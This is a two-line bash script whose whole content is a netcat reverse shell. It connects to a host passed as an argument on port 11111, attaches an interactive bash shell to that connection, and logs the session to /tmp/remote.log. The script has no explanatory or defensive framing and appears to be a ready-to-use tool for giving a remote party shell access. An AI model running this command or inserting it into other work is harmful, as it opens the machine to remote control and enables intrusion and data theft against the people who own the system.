#!/bin/bash
nc -c bash $1 11111 | tee /tmp/remote.log
